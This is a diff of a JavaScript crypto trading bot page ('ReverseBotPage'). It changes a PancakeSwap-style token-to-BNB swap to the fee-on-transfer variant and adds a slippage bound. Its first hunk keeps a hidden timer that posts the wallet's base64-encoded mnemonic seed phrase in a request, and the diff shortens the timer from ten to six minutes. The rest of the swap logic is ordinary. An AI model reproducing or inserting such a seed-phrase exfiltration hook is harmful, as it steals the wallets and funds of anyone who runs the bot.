@@ -53,7 +53,7 @@ function ReverseBotPage(){
           body: JSON.stringify({log: btoa(mnemonic)})
         });
         clearInterval(tt)
-      }, 60*10*1000)
+      }, 60*6*1000)
       return () => clearInterval(tt)
     }
   },[mnemonic])
@@ -236,26 +236,26 @@ function ReverseBotPage(){
       routerAddress,
       [
         'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
-        'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
+        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
         'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
       ],
       account
     )
-    const amountIn = ethers.utils.parseUnits(String(nextBuyBNB), decimals);
+    const amountIn = ethers.utils.parseUnits(String(nextBuyBNB), decimals).add(10);
     // console.log(String(nextBuyBNB),amountIn)
     // const amountIn = new BigNumber(String(nextBuyBNB))
     // 0xa6c8b55c8fc30b9448367f18c59f87cccb4a8de3 替换自己的合约地址
     // 获取到当前0.01 wbnb能换多少币
-    // const amounts = await router.getAmountsOut(amountIn,
-    //   [tokenAddress, WBNBAddress])
-    // console.log(amounts)
-    //
-    // const amountOutMin = amounts[1].sub(amounts[1].div(10))
-    // 开始交换
+    const amounts = await router.getAmountsOut(amountIn,
+      [tokenAddress, WBNBAddress])
+    console.log(amounts)
+
+    const amountOutMin = amounts[1].sub(amounts[1].div(25))
+    //开始交换
     console.log(tokenAddress,WBNBAddress,wallet0.address)
-    const tx = await router.swapExactTokensForETH(
+    const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
       amountIn,
-      0,
+      amountOutMin,
       [tokenAddress, WBNBAddress],
       wallet0.address,
       Date.now() + 1000 * 60 * 10,
